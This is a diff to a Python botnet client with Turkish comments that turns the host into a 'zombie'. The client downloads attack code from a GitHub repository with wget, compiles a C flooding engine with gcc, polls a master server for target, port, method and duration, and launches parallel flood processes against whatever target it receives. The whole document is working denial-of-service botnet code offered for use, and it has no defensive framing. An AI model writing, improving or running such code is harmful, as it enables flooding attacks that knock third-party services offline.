@@ -10,19 +10,30 @@ ZOMBI_AD = f"Zombi-{os.uname()[1]}"
 
 def temizlik_yap():
     print("🧹 Eski mühimmatlar temizleniyor...")
-    os.system("rm -f attack.py* slave.py* attack.log")
+    # Eski python dosyalarını ve logları temizle
+    os.system("rm -f attack.py* slave.py* attack.log mermi mermi.c")
     
-    print("📦 En güncel dosyalar mühimmat deposundan (GitHub) çekiliyor...")
-    os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/attack.py")
-    os.system("chmod +x attack.py")
+    print("📦 C-Engine ve kütüphaneler depodan çekiliyor...")
+    # GitHub'dan o canavar C kodunu çekiyoruz
+    os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/mermi.c")
+    
+    print("🛠️ Mermi Çekirdeği derleniyor (Jet Modu)...")
+    # C kodunu pthreads desteğiyle en yüksek optimizasyonda derle
+    derleme_durumu = os.system("gcc -O3 mermi.c -o mermi -lpthread")
+    
+    if derleme_durumu == 0:
+        print("✅ C-Engine başarıyla derlendi ve namluya sürüldü!")
+        os.system("chmod +x mermi")
+    else:
+        print("❌ HATA: C derlenemedi, sistemde gcc kurulu olduğundan emin ol.")
 
 def komut_dinle():
-    print(f"🚀 {ZOMBI_AD} tertemiz bir şekilde göreve hazır!")
+    print(f"🚀 {ZOMBI_AD} görev yerinde! Mermi Engine hazır.")
     print(f"📡 Beyin Bağlantısı: {MASTER_URL}")
     
     while True:
         try:
-            headers = {'bypass-tunnel-reminder': 'true', 'User-Agent': 'Zombi-V3-Clean'}
+            headers = {'bypass-tunnel-reminder': 'true', 'User-Agent': 'Zombi-C-Power'}
             response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=15)
             
             if response.status_code == 200:
@@ -34,28 +45,31 @@ def komut_dinle():
                 s = data.get("duration")
 
                 if method and target:
-                    thread_sayisi = t if t else 200
-                    print(f"\n[!] EMİR GELDİ: {method.upper()} -> {target}:{port} | Thread: {thread_sayisi}")
+                    # Eğer threads belirtilmemişse varsayılan 100 yapıyoruz (C için ideal)
+                    thread_sayisi = t if t else 100
+                    print(f"\n[!] SUPREME EMİR: {method.upper()} -> {target}:{port} | Kol: {thread_sayisi}")
 
-                    if not os.path.exists("attack.py"):
-                        os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/attack.py")
+                    # Eğer mermi çekirdeği bir şekilde silindiyse tekrar çek ve derle
+                    if not os.path.exists("./mermi"):
+                        print("⚠️ Mermi kayıp, yeniden hazırlanıyor...")
+                        os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/mermi.c")
+                        os.system("gcc -O3 mermi.c -o mermi -lpthread")
 
+                    # ARTIK PYTHON DEĞİL, C MOTORUNU TETİKLİYORUZ
                     attack_cmd = [
-                        "python3", "attack.py", 
+                        "./mermi", 
                         str(method), str(target), str(port), 
                         str(thread_sayisi), str(s)
                     ]
                     
-                    # --- TURBO MODU: BURASI HATTI ŞİŞİRECEK ---
                     with open("attack.log", "a") as log_file:
-                        # Tek bir işlem yerine 10 farklı koldan saldırıyı başlatıyoruz
-                        # Bu sayede GitHub'ın o devasa hattını sonuna kadar zorlayacağız.
-                        for i in range(10):
+                        # C zaten içinde thread açtığı için 1-2 işlem başlatmak hattı doyurur
+                        # Biz yine de garanti olsun diye 2 koldan C'yi ateşliyoruz
+                        for i in range(2):
                             subprocess.Popen(attack_cmd, stdout=log_file, stderr=log_file)
                     
-                    print(f"✅ ✅ 10 KAT GÜÇLE: Mermiler taze dosyadan ateşlendi!")
+                    print(f"✅ GÜÇ VERİLDİ: C-Engine %100 kapasiteyle mermi kusuyor!")
 
-            # Komut kontrol süresini biraz kısalttım (5 saniyeden 3'e) daha seri olsun
             time.sleep(3)
             
         except Exception as e:
@@ -63,5 +77,5 @@ def komut_dinle():
             time.sleep(10)
 
 if __name__ == "__main__":
-    temizlik_yap() # Önce ortalığı süpürür
-    komut_dinle()  # Sonra dinlemeye başlar
+    temizlik_yap() # Önce motoru hazırlar (C derler)
+    komut_dinle()  # Sonra emir bekler
